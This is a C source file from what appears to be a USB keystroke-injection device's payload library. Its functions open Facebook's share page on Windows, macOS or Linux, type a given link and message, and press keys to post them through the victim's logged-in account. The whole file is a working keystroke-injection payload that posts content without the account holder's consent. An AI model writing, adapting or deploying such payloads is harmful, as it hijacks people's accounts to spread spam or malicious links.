#include "psyduk/includes.h"
#include "payloads/includes.h"

#include "sharelink.h"

#include <util/delay.h>

void shareLink(const char* link, const char* text)
{
	PDDelay(1500);
	PDKeypress(KEY_TAB);
	PDTypeString(link);
	PDKeypress(KEY_ENTER);
	PDDelay(600);
	PDTypeString(text);
	PDDelay(200);
	PDKeypress(KEY_TAB);
	PDKeypress(KEY_SPACE);
}

void FBShareLink_windows(const char* link, const char* text)
{
	PDRunWindowsCommand_P("http://facebook.com/share.php");
	shareLink(link, text);
}

void FBShareLink_mac(const char* link, const char* text)
{
	PDRunMacOSXCommand_P("open http://facebook.com/share.php");
	shareLink(link, text);
}
void FBShareLink_linux(const char* link, const char* text)
{
	PDRunLinuxCommand_P("http://facebook.com/share.php");
	shareLink(link, text);
}

